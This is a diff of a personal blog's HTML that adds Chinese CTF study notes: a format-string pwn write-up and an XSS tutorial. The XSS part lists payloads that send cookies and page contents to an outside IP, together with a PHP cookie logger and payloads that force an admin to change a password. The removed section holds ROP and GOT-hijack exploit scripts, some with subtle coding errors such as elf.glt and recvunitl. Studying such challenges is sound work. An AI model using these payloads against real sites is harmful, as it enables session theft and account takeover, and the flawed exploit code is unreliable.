+<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/13.png"></p>
+<p><code>payload中为什么要加0x20 ?</code></p>
+<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/14.png"></p>
+<h3 id="BUU-HNCTF-2022-Week1-fmtstrre"><a href="#BUU-HNCTF-2022-Week1-fmtstrre" class="headerlink" title="BUU-[HNCTF 2022 Week1]fmtstrre"></a>BUU-[HNCTF 2022 Week1]fmtstrre</h3><p>先checksec一下</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/06.png"></p>
+<p>然后IDA(64)打开</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png"></p>
+<blockquote>
+<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
+<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
+<p>将name的地址赋值给v5</p>
+<p>再向buf中写入256字节数据</p>
+</blockquote>
+<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
+<p><code>这段代码中需要打开flag这个文件 =l&gt; 小技巧</code></p>
+<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
+<p>-&gt;当然,这个文件不是必须的.</p>
+<p><code>该如何利用这个漏洞？</code>根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
+<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
+<p><strong>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png"></p>
+<blockquote>
+<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
+</blockquote>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png"></p>
+<blockquote>
+<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
+<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
+<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
+</blockquote>
+<p>32 + 6 &#x3D;38</p>
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Web/XSS%20/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Li1x">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/CTF/Web/XSS%20/" class="post-title-link" itemprop="url">XSS学习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-03-26 01:53:47 / Modified: 01:56:19" itemprop="dateCreated datePublished" datetime="2024-03-26T01:53:47+08:00">2024-03-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/CTF/Web/XSS%20/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Web/XSS /" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>6.6k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>12 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li>
+<li>诱使受害者打开受到攻击的服务器URL。</li>
+<li>受害者在Web浏览器中打开URL，恶意脚本执行。</li>
+</ul>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内	容），一般容易出现在搜索页面。一般是后端代码进行处理</p>
+<p>存储型XSS：&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
+<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p>
+<p><strong>解释一些常用js代码的意思:</strong></p>
+<p><code>onload</code>：事件处理程序，它会在网页加载完成后执行</p>
+<p><code>document.cookie</code>：截取当前网页所有cooies，cookies是存储在用户浏览器上的小型数据片段，通常用于识别用户或保存的设置</p>
+<p><code>location.href</code>：这会将当前网页的url重定向到 后面的地址</p>
+<p><code>onerror</code>：当事件失败时会触发，<strong>配合img标签使用，不给图片地址（加载失败）&#x3D;&gt;触发onerror</strong></p>
+<p><strong>Linux服务器关闭端口的一些常用指令：</strong></p>
+<p><code>netstat -tuln</code></p>
+<blockquote>
+<p>-&gt; -t 是显示TCP协议的连接</p>
+<p>-&gt; -u 是显示UDP协议的连接</p>
+<p>-&gt; -l 是仅显示监听状态的连接</p>
+<p>-&gt; -n 是以数字形式显示端口号和IP地址</p>
+</blockquote>
+<p><strong>Xss测试过滤：</strong></p>
+<script>alert(1)</script>
+
+<p>&lt;img alert(1)&gt;</p>
+<body>alert(1)(</body>
+
+
+
+
+
+
+
+
+
+
+
+<h4 id="Xss-payload"><a href="#Xss-payload" class="headerlink" title="Xss payload"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/340080.html">Xss payload</a></h4><p><strong>1.无过滤</strong></p>
+<p><code>&lt;script&gt;location.href=&quot;http://(自己服务器的公网ip)/127.php(存放上述php代码的文件)?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 127.php 创建在自己的站点的根目录下（payload中路径一样即可）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);    <span class="comment"># a模式是追加模式（在文件末尾添加内容）</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2.过滤script</strong></p>
+<blockquote>
+<p><code>&lt;body onload=&quot;location.href=&#39;http://(自己服务器的公网ip)/127.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p><code>&lt;img src=&#39;&#39; onerror=location.href=&#39;http://39.103.98.109/127.php?cookie=&#39;+document.cookie&gt;</code></p>
+<p><code>&lt;svg/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
+<p><code>&lt;input/**/οnfοcus=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
+<p><code>&lt;iframe/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;</code></p>
+</blockquote>
+<p><strong>存储型Xss payload：</strong></p>
+<p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<p><strong>以ctfshow xss web328为例：</strong></p>
+<p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.cookie)&lt;/script&gt;</code></p>
+<p>题目：用户管理页面有信息（需要是admin用户    才可以看到flag）</p>
+<p>思路：伪造SESSION admin用户</p>
+<p><strong>1. 获取admin的SESSION：监听端口，用户注册，收到的信息里面的SESSION应该是admin的</strong></p>
+<p><img src="/CTF/Web/XSS/328-00.png"></p>
+<p><img src="/CTF/Web/XSS/328-01.png"></p>
+<p><strong>2.抓包改SESSION 发包：这里面需要发两次包  每次收到的包都要改SESSION再发送</strong></p>
+<p><img src="/CTF/Web/XSS/328-02.png"></p>
+<p><img src="/CTF/Web/XSS/328-03.png"></p>
+<h4 id="对于登录Cookie就失效的，无法伪造cookie："><a href="#对于登录Cookie就失效的，无法伪造cookie：" class="headerlink" title="对于登录Cookie就失效的，无法伪造cookie："></a>对于登录Cookie就失效的，无法伪造cookie：</h4><p><strong>法一：外带信息payload：（监听端口）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、innerHTML:从对象的起始位置到终止位置的全部内容,不包括Html标签。 innerText可替代innerHTML</span><br><span class="line">2、outerHTML:除了包含innerHTML的全部内容外, 还包含对象标签本身。</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></p>
+<p>-&gt; <code>window.open</code> 打开新链接</p>
+<p>-&gt; <code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;) </code>是一个通过类名查找元素的方法。它查找具有类名 ‘layui-table-cell’ 和 ‘laytable-cell-1-0-1’ 的元素，通常这是一种针对表格单元格的选择。</p>
+<p>-&gt; <code>[1]</code> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）</p>
+<p><strong>法二：jQuery 选择器查找类和获取内容。</strong></p>
+<p>jQuery选择器：用于选择HTML元素的强大工具，使得开发者能更好的获取页面中的元素.</p>
+<p><code>&lt;script&gt;$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if ((value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#39;script&#39;) === -1)) &#123;window.location.href = &#39;http://39.103.98.109:10086/&#39; +value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
+<blockquote>
+<p><code>$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index, value) &#123; ... &#125;);</code></p>
+<p>这是一个 jQuery 选择器，它查找具有类名 <code>&#39;layui-table-cell&#39;</code>、<code>&#39;laytable-cell-1-0-1&#39;</code> 的 <code>&lt;div&gt;</code> 元素集合，并对每个元素执行一个函数</p>
+</blockquote>
+<blockquote>
+<p><code>.each(function(index, value) &#123; ... &#125;)</code></p>
+<p>这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，<code>index</code> 表示当前元素在集合中的索引，<code>value</code> 表示当前元素的引用。</p>
+</blockquote>
+<blockquote>
+<p><code>if (value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1) &#123; ... &#125;</code><br>这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 <code>&#39;ctfshow&#123;&#39;</code>。<code>value.innerHTML</code> 表示当前元素的 HTML 内容，<code>.indexOf(&#39;ctfshow&#123;&#39;)</code> 用于查找是否包含 <code>&#39;ctfshow&#123;&#39;</code>，如果包含则返回大于 -1 的索引，否则返回 -1</p>
+</blockquote>
+<blockquote>
+<p><code>window.location.href = &#39;http://120.46.41.173:9023/&#39; + value.innerHTML;</code><br> 如果条件满足，即当前元素的内容包含 <code>&#39;ctfshow&#123;&#39;</code>，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 <code>&#39;http://120.46.41.173:9023/&#39;</code> 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 <code>&#39;ctfshow&#123;&#39;</code> 以及其他内容。</p>
+</blockquote>
+<p><strong>法三：querySelector方法获取内容</strong></p>
+<p>querySelector：DOM（文档对象模型）选择器，通过CSS选择器从文档中获取一个匹配的元素，返回的是文档中匹配指定的CSS选择器中的第一个元素。    querySelectorAll返回匹配的全部元素</p>
+<p><strong>基本语法：</strong></p>
+<ul>
+<li><code>var element = document.querySelector(selector);</code></li>
+</ul>
+<p>-&gt; selector 是一个字符串，表示要查找的元素的CSS选择器</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过ID选择元素</span></span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line"><span class="comment">// 通过类名选择元素</span></span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line"><span class="comment">// 通过标签名选择元素</span></span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line"><span class="comment">// 使用复杂的选择器，本题就是这种</span></span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p<span class="punctuation">:</span>first-child&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><code>\#top &gt; div.layui-container</code> 可以将所有源码都读了, 最方便</p>
+<p><strong>web329 payload:</strong></p>
+<p> <code>&lt;script&gt;var img = new Image();img.src = &quot;http://39.103.98.109:10086/&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;document.body.append(img);&lt;/script&gt;</code></p>
+<blockquote>
+<p>new Image() 创建新的图像元素对象，并将其分配给了img变量.</p>
+</blockquote>
+<blockquote>
+<p>img.src &#x3D; “<a target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>“ +  document.querySelector(‘#top &gt; div.layui-container &gt;  div:nth-child(4) &gt; div &gt; div.layui-table-box &gt;  div.layui-table-body.layui-table-main’).textContent;</p>
+<p>这个设置了src属性，通过多个部分拼接，首先是地址 + document.querySelector()DOM查询操作 + textContent是获取DOM元素文本的内容的属性</p>
+</blockquote>
+<blockquote>
+<p>document.body.append(img) 这段代码将创建的图像元素img添加到页面的body元素内，这样图像就会被加载并显示在页面上.</p>
+</blockquote>
+<p><strong>web330 payload：</strong></p>
+<p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=1717&#39;;&lt;/script&gt;</code></p>
+<p>思路：这个题可以修改密码，让admin管理员自己修改密码.</p>
+<p>自己先注册号，在修改密码页面抓包，看是什么情况</p>
+<p><img src="/CTF/Web/XSS/330.01.png"></p>
+<p>很明显，有了路径，且变量p就是我们修改密码的变量</p>
+<p>直接创建账号密码 都为 payload，让admin在点击我们的payload的时候，会自动修改密码为1717</p>
+<p>这个时候我们直接以admin账号 密码为1717登录即可，</p>
+<p>-&gt; 然后点击用户管理（这个时候也相当于点击我们的payload的，会发生页面跳转）</p>
+<p>-&gt; 我们可以点击用户管理的同时打开源码或者抓包。</p>
+<p><strong>web 331：</strong></p>
+<p>这个题变成了post方法，改一改payload即可，其他与上一题一样：</p>
+<p><code>&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;&#125;)&lt;/script&gt;</code></p>
+<p>-&gt; 这段代码是用<code>jQuery</code>库中的 <code>$.ajax()</code> 函数发起的一个异步http请求。</p>
+<p>-&gt; <code>$.ajax(&#123;&#125;)</code> 这是<code>jQuery</code>库提供的用于异步http请求的方法。它接受一个包含配置选项的对象作为参数</p>
+<p>-&gt;<code>url:&quot;api/change.php&quot;</code> 这是请求的目标URL，请求被发送到目标URL，向服务器发送一个HTTP请求</p>
+<p>-&gt;<code>mthod:&quot;POST&quot;</code> 这是表明 此次HTTP请求的方法是POST方法</p>
+<p>-&gt; <code>data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;</code> 这是参数及值</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133375048">参考ctfshow web入门 xss payload</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1352,7 +1819,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-11 00:28:43" itemprop="dateModified" datetime="2024-03-11T00:28:43+08:00">2024-03-11</time>
+      <time title="Modified: 2024-03-26 01:59:35" itemprop="dateModified" datetime="2024-03-26T01:59:35+08:00">2024-03-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1385,14 +1852,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>2.1k</span>
+      <span>0</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>4 mins.</span>
+      <span>1 mins.</span>
     </span>
 </div>
 
@@ -1403,332 +1870,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p><strong>知识点：格式化字符串劫持、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移</a></strong></p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/05.png"></p>
-<p><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>寻找偏移量 找 616161在第几位 </p>
-<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
-</blockquote>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/01.png"></p>
-<p><strong>法2,栈迁移,可以先阅读前面的那个文章</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>Q&amp;A（个人理解）</p>
-<p><code>%16$p是哪来的</code></p>
-<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/02.png"></p>
-<p><code>0x60是哪里来的?</code></p>
-<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/03.png"></p>
-<p><code>payload中为什么要加0x20 ?</code></p>
-<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/04.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
